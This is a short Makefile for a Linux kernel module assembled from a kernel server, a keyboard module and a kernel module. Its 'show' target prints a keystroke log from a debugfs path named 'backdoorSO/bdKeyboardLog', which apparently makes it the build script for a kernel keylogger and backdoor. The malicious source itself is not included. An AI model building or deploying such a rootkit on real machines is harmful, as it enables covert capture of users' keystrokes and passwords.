obj-m += main_module.o
main_module-y = kernel_server.o keyboardmodule.o kernelmodule.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

insert:
	sudo insmod kernelmodule.ko

remove:
	sudo rmmod kernelmodule.ko

show:
	sudo cat /sys/kernel/debug/backdoorSO/bdKeyboardLog

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
